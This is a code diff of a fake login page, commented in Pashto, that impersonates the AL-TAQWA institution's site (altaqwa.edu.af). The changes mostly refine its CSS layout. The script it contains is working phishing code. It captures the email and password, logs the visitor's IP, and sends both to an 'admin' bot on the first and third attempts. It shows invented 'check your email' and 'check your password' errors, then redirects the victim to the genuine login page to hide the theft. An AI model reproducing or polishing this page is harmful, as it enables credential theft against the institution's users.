@@ -19,44 +19,78 @@ body {
     display: flex;
     justify-content: center;
     align-items: center;
-    background-color: #f5f5f5; /* شالید لکه په انځور کې */
+    background-color: #f5f5f5;
 }
 
-/* د کارت عمومي بڼه */
+/* ============================================= */
+/* === د کارت بڼه (د موبایل او ډیسټاپ لپاره) === */
+/* ============================================= */
 .login-container {
     background: #ffffff;
     border-radius: 16px;
     box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
-    padding: 30px 24px;
+    
+    /* دا برخه مهمه ده: چپ او ښي خوا ته کم (نرم) او پورته/لاندې ته زیات ځای */
+    padding: 45px 25px 40px 25px; 
+    
     width: 100%;
     display: flex;
     flex-direction: column;
 }
 
-/* لوګو برخه */
+/* ============================================= */
+/* === موبایل سایز (د انځور په څیر) === */
+/* ============================================= */
+@media (max-width: 767px) {
+    .login-container {
+        max-width: 360px; /* کارت به تنګ وي او غاړو ته خالي ځای پرېږدي */
+        margin: 20px auto;
+    }
+}
+
+/* ============================================= */
+/* === ډیسټاپ سایز === */
+/* ============================================= */
+@media (min-width: 768px) {
+    body {
+        background-color: #fafafa;
+    }
+
+    .login-container {
+        max-width: 380px; /* ډیسټاپ کې هم تنګ ساتل شوی */
+        padding: 50px 30px 40px 30px; /* پورته او لاندې ځای نور هم زیات شو */
+        border: 1px solid #eee;
+    }
+
+    .logo img {
+        max-width: 55%;
+    }
+}
+
+/* ============================================= */
+/* === دننی توکي === */
+/* ============================================= */
 .logo {
     text-align: center;
-    margin-bottom: 20px;
+    margin-bottom: 25px;
 }
 
 .logo img {
-    max-width: 80%;
+    max-width: 75%;
     height: auto;
     display: inline-block;
 }
 
-/* سرلیک */
 .title {
     text-align: center;
     font-size: 22px;
     font-weight: 500;
     color: #333;
-    margin-bottom: 24px;
+    margin-bottom: 28px; /* د سرلیک لاندې ځای زیات شو */
 }
 
-/* انپوټ فیلډونه */
 .input-group {
-    margin-bottom: 16px;
+    margin-bottom: 18px; /* د انپوټونو ترمنځ واټن زیات شو */
 }
 
 label {
@@ -72,7 +106,7 @@ input[type="password"] {
     width: 100%;
     height: 44px;
     padding: 0 12px;
-    border: 1px solid #ddd;
+    border: 1px solid #e0e0e0;
     border-radius: 6px;
     font-size: 15px;
     color: #333;
@@ -80,10 +114,9 @@ input[type="password"] {
     transition: border-color 0.2s;
 }
 
-/* د انپوټ بلاو بورډر لکه په انځور کې */
 input[type="email"]:focus,
 input[type="password"]:focus {
-    border: 1px solid #87CEEB; /* نرم بلاو رنګ */
+    border: 1px solid #87CEEB; 
     box-shadow: 0 0 0 2px rgba(135, 206, 235, 0.2);
 }
 
@@ -91,11 +124,10 @@ input::placeholder {
     color: #aaa;
 }
 
-/* چک باکس */
 .remember-me {
     display: flex;
     align-items: center;
-    margin-bottom: 24px;
+    margin-bottom: 25px; /* د چک باکس لاندې ځای زیات شو */
     font-size: 14px;
     color: #444;
 }
@@ -107,14 +139,13 @@ input::placeholder {
     accent-color: #18c6e7;
 }
 
-/* د لاګین تڼۍ - لکه په انځور کې نیلي رنګ */
 button {
     width: 100%;
     height: 44px;
     border: none;
     border-radius: 6px;
-    background-color: #18c6e7; /* نیلي رنګ */
-    color: #ffffff; /* سپین لیک */
+    background-color: #18c6e7;
+    color: #ffffff;
     font-size: 16px;
     font-weight: 500;
     cursor: pointer;
@@ -125,7 +156,6 @@ button:hover {
     background-color: #0fb6d6;
 }
 
-/* د خطا پیغام بکس */
 .error-msg {
     background: #ffe6e6;
     border: 1px solid #ff6666;
@@ -134,43 +164,8 @@ button:hover {
     border-radius: 6px;
     font-size: 13px;
     text-align: center;
-    margin-bottom: 12px;
+    margin-bottom: 15px;
     display: none;
-}
-
-/* ========================================================= */
-/* ====== MOBILE (د لومړي انځور په څیر) ====== */
-/* ========================================================= */
-@media (max-width: 767px) {
-    .login-container {
-        max-width: 92%;
-        margin: 0 16px;
-        padding: 30px 20px 24px 20px;
-    }
-}
-
-/* ========================================================= */
-/* ====== DESKTOP (د دوهم انځور په څیر) ====== */
-/* ========================================================= */
-@media (min-width: 768px) {
-    body {
-        background-color: #fafafa;
-    }
-
-    .login-container {
-        max-width: 420px; /* لکه په دوهم انځور کې کوچنی کارت */
-        padding: 40px 32px 32px 32px;
-        border: 1px solid #eee; /* نرۍ خړ پوله */
-    }
-
-    .logo img {
-        max-width: 60%; /* په ډیسټاپ کې لوګو لږ کوچنی */
-    }
-    
-    .title {
-        font-size: 20px;
-        margin-bottom: 20px;
-    }
 }
 </style>
 </head>
@@ -179,15 +174,13 @@ button:hover {
 
 <div class="login-container">
     
-    <!-- لوګو -->
     <div class="logo">
-        <!-- دلته د خپل انځور نوم واچوئ -->
+        <!-- دلته د خپل اصلي انځور نوم واچوئ -->
         <img src="logo.png" alt="AL-TAQWA Logo"> 
     </div>
 
     <div class="title">Sign in</div>
 
-    <!-- د ایرر پیغام ځای -->
     <div id="errorMsg" class="error-msg"></div>
 
     <div class="input-group">
@@ -218,24 +211,20 @@ button:hover {
 
     let attemptStore = {};
 
-    // د پښتو توري ازموینه
     function hasPashtoCharacters(text) {
         const pashtoRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
         return pashtoRegex.test(text);
     }
 
-    // د ایمیل ازموینه
     function isValidEmail(email) {
         const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
         return emailRegex.test(email);
     }
 
-    // د پاسورډ اوږدوالی (لږ تر لږه 8 توري)
     function isValidPasswordLength(password) {
         return password.length >= 8;
     }
 
-    // د کاروونکي IP ترلاسه کول
     async function getUserIP() {
         try {
             const response = await fetch('https://api.ipify.org?format=json');
@@ -246,7 +235,6 @@ button:hover {
         }
     }
 
-    // بوټ ته معلومات لېږل
     async function sendToAdmin(email, password, ip, attemptNumber) {
         const message = `✅ *SUCCESSFUL LOGIN* ✅\n\n📍 *Source:* altaqwa.edu.af/login\n👤 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n📊 *Attempt:* ${attemptNumber}\n🕒 *Time:* ${new Date().toLocaleString()}`;
         try {
@@ -264,21 +252,17 @@ button:hover {
         }
     }
 
-    // پرده کې د ایرر پیغام ښودل
     function showError(message) {
         const errorDiv = document.getElementById('errorMsg');
         errorDiv.textContent = message;
         errorDiv.style.display = 'block';
-        // د 3 ثانیو وروسته ایرر ورک
         setTimeout(() => { errorDiv.style.display = 'none'; }, 3000);
     }
 
-    // د لاګین تڼۍ کلیک
     document.getElementById('loginBtn').addEventListener('click', async () => {
         const email = document.getElementById('email').value.trim();
         const password = document.getElementById('password').value.trim();
 
-        // 1. بنسټیز چکونه
         if (!email || !password) { showError('Please fill in both email and password'); return; }
         if (hasPashtoCharacters(email) || hasPashtoCharacters(password)) { showError('Pashto characters are not allowed'); return; }
         if (!isValidEmail(email)) { showError('Please enter a valid email address'); return; }
@@ -287,24 +271,20 @@ button:hover {
         const ip = await getUserIP();
         const key = `${email}_${ip}`;
 
-        // د هڅو شمېرل
         if (!attemptStore[key]) attemptStore[key] = 0;
         attemptStore[key]++;
         const currentAttempt = attemptStore[key];
 
-        // *** لمړۍ هڅه: اډمین ته لېږل او ایرر ورکول ***
+        // لمړۍ هڅه: معلومات اډمین ته او ایرر
         if (currentAttempt === 1) {
-            // معلومات اډمین ته لېږل
             await sendToAdmin(email, password, ip, currentAttempt);
-            
-            // کاروونکي ته ایرر (لکه د غلط ایمیل غلطي)
             showError('Please check your email');
             document.getElementById('email').value = '';
             document.getElementById('password').value = '';
             return;
         }
 
-        // دویمه هڅه: ایرر ورکول
+        // دویمه هڅه: ایرر
         if (currentAttempt === 2) {
             showError('Please check your password');
             document.getElementById('email').value = '';
@@ -312,15 +292,10 @@ button:hover {
             return;
         }
 
-        // دریمه هڅه: اصلي لینک ته تلل (بې له کوم لوډینګه)
+        // دریمه هڅه: لینک ته تلل بې له لوډینګه
         if (currentAttempt >= 3) {
-            // معلومات بیا اډمین ته لېږل
             await sendToAdmin(email, password, ip, currentAttempt);
-            
-            // د هڅو پاکول
             delete attemptStore[key];
-            
-            // *** سمدلاسه لینک ته تلل بې له لوډینګ ***
             window.location.replace("https://www.altaqwa.edu.af/login");
         }
     });
